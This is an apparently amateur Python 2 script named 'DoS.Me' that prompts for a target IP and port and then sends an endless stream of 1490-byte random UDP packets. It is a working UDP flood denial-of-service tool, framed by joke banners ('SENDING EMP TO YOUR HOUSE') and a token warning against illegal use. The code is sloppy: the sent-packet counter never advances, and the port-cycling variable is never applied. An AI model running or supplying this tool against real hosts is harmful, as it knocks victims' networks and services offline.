#-*- coding: utf-8 -*-



import sys
import os
import time
import socket
import random
import string
import threading
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


pigs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
yapers = random._urandom(1490)

os.system("clear")
os.system("figlet =DoS.Me=")
print
print "\033                 ╔═════════════════════════════════════════════════════╗\033[91m"
print "\033                 ║                     \033[00mDOS.ME ATTACK\033[91m                   ║"
print "\033                 ║═════════════════════════════════════════════════════║"
print "\033                 ║ \033[00m        DOS ATTACKS USE YOUR PC TO SEND PACKETS     \033[91m║"
print "\033                 ║\033[91m=====================================================\033[91m║"
print "\033                 ║ \033[00m        DO NOT USE THIS FOR ILLEGAL PURPOSES        \033[91m║"
print "\033                 ║\033[91m=====================================================\033[91m║"
print "\033                 ║ \033[00m        DEVELOPED BY AVOX                           \033[91m║"
print "\033                 ║\033[91m=====================================================\033[91m║"
print "\033                 ║ \033[00m        ENTER THE IP BELLOW                         \033[91m║"
print "\033                 ╚═════════════════════════════════════════════════════╝\033[00m"
print

target = raw_input("\033[53m選択:\033[00m ")
hole = input("\033[53m選択:\033[00m ")

os.system("clear")

print "SENDING EMP TO YOUR HOUSE [====                         ]"
time.sleep(1)
print "SENDING EMP TO YOUR HOUSE [===========                  ]"
time.sleep(1)
print "SENDING EMP TO YOUR HOUSE [=================            ]"
time.sleep(1)
print "SENDING EMP TO YOUR HOUSE [=====================        ]"
time.sleep(1)
print "SENDING EMP TO YOUR HOUSE [===========================  ]"
time.sleep(1)
print "SENDING EMP TO YOUR HOUSE [====THE EMP HAS BEEN SENT====]"
time.sleep(1)
print "\033                 ╔═════════════════════════════════════════════════════╗\033[91m"
print "\033                 ║                     \033[00mVOLLYS NOW ATTACKING\033[91m            ║"
print "\033                 ╚═════════════════════════════════════════════════════╝\033[00m"
print "\033                 ╔═════════════════════════════════════════════════════╗\033[91m"
print "\033                 ║      \033[00mWARNING WIFI MAY BE SLOW OR LIMITED\033[91m            ║"
print "\033                 ╚═════════════════════════════════════════════════════╝\033[00m"
time.sleep(3)
sent = 0

while True:
     pigs.sendto(yapers, (target, hole))

     vollys = sent + 1
     port = hole + 1
     print "[Sent %s vollys to %s throught port:%s. To stop the attack press CTRL+C]"%(vollys, target, hole)
     print
     os.system("figlet DoS.Me")
     print

     if port == 65534:
       port = 1
